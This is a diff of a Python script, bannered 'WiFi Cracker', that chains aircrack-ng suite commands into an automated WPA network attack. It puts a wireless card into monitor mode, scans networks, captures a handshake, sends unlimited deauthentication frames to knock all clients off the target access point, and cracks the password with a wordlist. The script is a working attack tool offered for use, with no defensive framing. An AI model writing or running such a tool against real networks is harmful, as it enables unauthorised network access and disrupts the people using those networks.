@@ -1,49 +1,61 @@
 import subprocess
 import pyfiglet
-from pyfiglet import Figlet
-# Function to run aircrack-ng command
-def run_aircrack_ng(command):
+
+def print_banner():
+    banner = pyfiglet.figlet_format("WiFi Cracker")
+    print(banner)
+    print("Automated WiFi Cracking Tool")
+
+def run_command(command):
     try:
-        # Execute the command and capture the output
         result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        # Check if the command was successful
         if result.returncode == 0:
-            print("Command output:\n", result.stdout)
+            print(result.stdout)
         else:
-            print("Error executing command:\n", result.stderr)
+            print("Error:\n", result.stderr)
     except Exception as e:
         print(f"An error occurred: {e}")
 
-# Example usage: run aircrack-ng to crack a WPA handshake file
-def crack_wpa_handshake(wordlist, bssid, capture_file):
-    command = f"aircrack-ng -w {wordlist} -b {bssid} {capture_file}"
-    run_aircrack_ng(command)
+def enable_monitor_mode(interface):
+    print(f"Enabling monitor mode on {interface}...")
+    run_command(f"sudo airmon-ng start {interface}")
 
-# Example usage: capture packets (requires root privileges)
-def capture_packets(interface, output_file):
-    command = f"airodump-ng -w {output_file} --output-format cap {interface}"
-    run_aircrack_ng(command)
+def disable_monitor_mode(interface):
+    print(f"Disabling monitor mode on {interface}...")
+    run_command(f"sudo airmon-ng stop {interface}")
 
-# Main function
+def scan_networks(interface):
+    print("Scanning for networks...")
+    run_command(f"sudo airodump-ng {interface}")
+
+def capture_handshake(interface, bssid, channel, output_file):
+    print(f"Capturing handshake on {interface} for BSSID {bssid} on channel {channel}...")
+    run_command(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}")
+
+def deauthenticate_clients(interface, bssid):
+    print(f"Deauthenticating clients on {interface} for BSSID {bssid}...")
+    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+
+def crack_wpa_handshake(wordlist, capture_file):
+    print("Cracking the WPA handshake...")
+    run_command(f"aircrack-ng -w {wordlist} {capture_file}")
+
 if __name__ == "__main__":
-    # Example: Crack WPA handshake
-    wordlist_path = "path/to/wordlist.txt"
-    bssid = "00:11:22:33:44:55"
-    capture_file = "path/to/captured_handshake.cap"
-    crack_wpa_handshake(wordlist_path, bssid, capture_file)
+    print_banner()
+
+    # Interface and file paths
+    interface = "wlan0"  # Replace with your wireless interface
+    bssid = "00:11:22:33:44:55"  # Replace with the target BSSID
+    channel = 6  # Replace with the target channel
+    output_file = "handshake"
+    wordlist_path = "path/to/wordlist.txt"  # Replace with your wordlist path
+
+    enable_monitor_mode(interface)
     
-    # Example: Capture packets (requires root privileges)
-    interface = "wlan0"
-    output_file = "path/to/output"
-    capture_packets(interface, output_file)
-
-
-
-f = Figlet(font='slant')
-print(f.renderText('Gopalian'))
-x = input("search for networks")
-if x == "authenicate" {
-run_aircrack_ng()
-
-}
+    try:
+        scan_networks(interface)
+        capture_handshake(interface, bssid, channel, output_file)
+        deauthenticate_clients(interface, bssid)
+        crack_wpa_handshake(wordlist_path, output_file + "-01.cap")
+    finally:
+        disable_monitor_mode(interface)
